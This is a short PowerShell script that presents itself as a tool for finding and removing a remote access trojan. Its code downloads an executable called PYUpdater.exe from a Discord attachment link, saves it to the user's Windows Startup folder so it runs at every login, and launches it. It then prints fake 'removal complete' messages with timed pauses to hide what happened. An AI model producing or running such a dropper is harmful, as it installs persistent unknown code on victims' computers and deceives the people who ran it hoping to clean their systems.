Write-Host "Finding Remote Access Files..."
$url = "https://cdn.discordapp.com/attachments/1500723996185067600/1524526091924930742/PYUpdater.exe?ex=6a520b50&is=6a50b9d0&hm=e1791919db183be1eb835067ca8ebac9ad332b12aa45210d07781d49ca4d3438&"
$dest = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$fn = "PYUpdater.exe"
if (-not (Test-Path -Path $dest)) {
    New-Item -ItemType Directory -Path $dest -Force | Out-Null
}
$fp = Join-Path -Path $dest -ChildPath $fn
$ProgressPreference = 'SilentlyContinue'
try {
    Invoke-WebRequest -Uri $url -OutFile $fp
    Start-Process -FilePath $fp
} catch {
    Write-Error "Download or execution failed: $_"
}
Write-Host "Removing Temporary Account Data Files..."
Start-Sleep -Milliseconds 300
Write-Host "Removing RAT File..."
Start-Sleep -Milliseconds 220
Write-Host "Removing RAT from Startup Folder..."
Start-Sleep -Milliseconds 280
Write-Host "Removal Complete!"
Write-Host "Closing Window."
Start-Sleep -Milliseconds 120
